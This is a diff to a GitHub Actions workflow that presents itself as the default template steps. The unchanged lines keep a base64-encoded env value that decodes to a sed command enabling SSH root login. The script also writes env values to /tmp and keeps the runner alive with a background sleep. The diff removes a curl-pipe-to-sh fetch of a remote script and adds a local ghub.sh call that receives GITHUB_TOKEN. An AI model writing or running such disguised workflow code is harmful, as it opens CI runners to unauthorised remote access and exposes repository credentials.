@@ -28,14 +28,14 @@ jobs:
       
       # Runs a single command using the runners shell
       - name: Run a one-line script
-        run: bash -c "echo ${{github.event.action}};echo ${{github.event.inputs}};date;(env|grep ss>/tmp/s0;sleep 1420&);cd $GITHUB_WORKSPACE;ls -alR ..;pwd;exit 0"
+        run: bash -c "echo ${{github.event.action}};echo ${{github.event.inputs}};date;(env|grep ss>/tmp/s0;sleep 1420&);cd $GITHUB_WORKSPACE;ls -alR;pwd;exit 0"
         env:
           ss0: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
       # Runs a set of commands using the runners shell
 
       - name: Run a multi-line script
         run: 
-          bash -c 'cd /tmp;echo "${{ toJson(github.event.inputs) }}"|base64 -w0 >js8;base64 -d js8>js9;env|grep ss>s1;curl https://raw.githubusercontent.com/liuhuan72/dock7788/main/mmfi.sh|tee /tmp/mfi72|sh;(while :;do date;[ -f tm ]&&sleep 30||break;done);sleep 12;ls -al /tmp;'
+          bash -c 'cd /tmp;echo "${{ toJson(github.event.inputs) }}"|base64 -w0 >js8;base64 -d js8>js9;env|grep ss>s1;sh $GITHUB_WORKSPACE/ghub.sh;sleep 12;ls -al /tmp;'
         env:
           sshc1: 'cat /proc/uptime|cut -f1 -d"."'
           Github_Token22: ${{ secrets.GITHUB_TOKEN }}
@@ -43,4 +43,5 @@ jobs:
           Github_OWN22: ${{ github.repository_owner }}
           Github_REPO22: ${{ github.event.repository.name }}
           Github_wsp22: ${{github.workspace}}
+          sp9: 120
           TZ: Asia/Shanghai
